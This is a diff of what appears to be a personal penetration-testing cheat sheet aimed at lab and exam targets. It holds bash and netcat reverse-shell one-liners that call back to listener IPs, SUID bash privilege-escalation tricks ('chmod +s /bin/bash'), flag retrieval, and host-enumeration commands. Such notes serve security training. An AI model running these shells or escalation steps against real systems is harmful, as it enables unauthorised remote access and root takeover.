@@ -159,7 +159,7 @@ hit ctrl+z to background our shell and get back on our local terminal, and input
 ```bash
 # bash reverse shell
 bash -i >& /dev/tcp/192.168.45.x/80 0>&1
-bash -c 'bash -i >& /dev/tcp/192.168.45.x/80 0>&1'
+bash -c 'bash -i >& /dev/tcp/192.168.45.202/80 0>&1'
 bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
 echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/192.168.45.176/80 0>&1"' | base64
 
@@ -168,6 +168,10 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 # this copies /bin/bash with SUID privilege! pretty useful(must be run with -p option so keep the privilege)
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > full-checkup.sh
 /tmp/0xdf -p
+
+# just add +s
+echo "chmod +s /bin/bash" > /tmp/root.sh
+/bin/bash -p
 
 ++++++++++++++++ Python reverse shell ++++++++++++++++++++++++++++++++++++++++++++
 
@@ -730,11 +734,10 @@ root.txt                     34
 
 Get-Content -path hm.txt -stream root.txt
 
-# If powershell is not working..
+# If powershell is not working, use this way
 dir /R
 more < hm.txt:root.txt
 ```
-
 
 ### gitdumper
 ```bash
@@ -761,7 +764,6 @@ whatweb -a3 https://www.facebook.com -v
 ```bash
 sudo ntpdate 10.10.x.x
 ```
-
 
 
 ### certipy (https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
@@ -1050,6 +1052,7 @@ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping
 
 ### feroxbuster 
 ```bash
+feroxbuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://10.10.10.12 -x txt,php,html
 feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.222.62/ -C 404,401,403,502,500 -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config
 feroxbuster -u http://192.168.209.153:8000/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config -t 200
 ```
@@ -2844,10 +2847,19 @@ find / -type f -name 'proof.txt' 2>/dev/null
 cat /home/user/.bash_aliases
 cat /home/user/.bash_history
 
+# doas(same as sudo) -> check this blog(https://0xdf.gitlab.io/2023/06/10/htb-soccer.html)
+find / -name doas.conf 2>/dev/null
+
+# Important directories
+/var
+/opt
+/srv
+/etc
+
 # Check config files
 /var/www/html/sites/default/config.php
 
-# Enumerate other userse(This is really important because we might have to pivot to other users)
+# Enumerate other users(This is really important because we might have to pivot to other users)
 cat /etc/passwd
 
 # Operating system release and version
@@ -2869,6 +2881,7 @@ routel
 
 # Active network connections
 ss -anp
+netstat -tnlp
 
 # Firewall rule
 cat /etc/iptables/rules.v4
@@ -2877,6 +2890,9 @@ cat /etc/iptables/rules.v4
 ls -lah /etc/cron*
 cat /etc/crontab
 crontab -l
+
+# Run pspy64 to check cronjob that's running
+pspy
 
 # Installed applications
 dpkg -l
@@ -2899,7 +2915,9 @@ lsblk
 
 ## Linux Privilege Strategy
 - Run linpeas and check every file that's red
-- Run pspy to see if we're missing anything
+- Check what's already there when you land reverse shell(might be some conf files etc)
+- Check network information for any hidden/unknown vhost(and see where they're located at)
+- Run pspy to see if we're missing anything(MEaning check cronjob!)
 - When current user can't use wget that probably means we need to pivot as someone else
 - See if other person can ssh as root(check important files such as .bash_history, .bash_aliases)
 - If the current user can run webserver on victim machine, it's likely that we can only access that port on the same machine
